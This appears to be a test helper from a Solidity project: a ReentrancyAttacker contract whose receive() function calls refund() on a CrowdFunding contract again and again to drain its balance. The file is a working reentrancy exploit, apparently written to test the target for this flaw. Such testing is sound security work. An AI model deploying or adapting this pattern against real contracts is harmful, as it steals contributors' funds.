// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../src/CrowdFunding.sol";

contract ReentrancyAttacker {
    CrowdFunding public crowdFunding;

    constructor(address _crowdFunding) {
        crowdFunding = CrowdFunding(_crowdFunding);
    }

    function contribute() external payable {
        // Become a contributor
        crowdFunding.contribution{value: msg.value}();
    }

    function attack() external {
        // Start the attack
        crowdFunding.refund();
    }

    receive() external payable {
        uint256 contribution = crowdFunding.contributors(address(this));

        if (
            contribution > 0 &&
            address(crowdFunding).balance >= contribution
        ) {
            crowdFunding.refund();
        }
    }
}